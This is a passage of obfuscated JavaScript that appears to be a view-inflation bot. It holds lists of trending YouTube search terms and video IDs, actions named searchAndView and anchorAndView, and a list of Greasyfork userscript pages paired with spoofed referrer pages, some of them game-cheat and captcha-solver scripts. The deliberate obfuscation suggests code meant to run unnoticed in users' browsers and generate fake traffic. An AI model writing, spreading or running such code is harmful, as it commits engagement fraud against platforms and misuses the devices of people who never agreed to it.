't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x73e + -0x26f9 + 0x2e41)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x733 * 0x2 + -0x1670 * -0x1 + -0x800)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2320 + 0xd * 0x1 + -0x1195 * 0x2);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    X(0xd) + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    X(0x3) + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    X(0x4) + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    X(0x8) + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    Y(0x19, 'L4Km') + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    X(0x9) + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    Y(0xe, '4fGN') + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': Y(0x18, 'FrbR') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
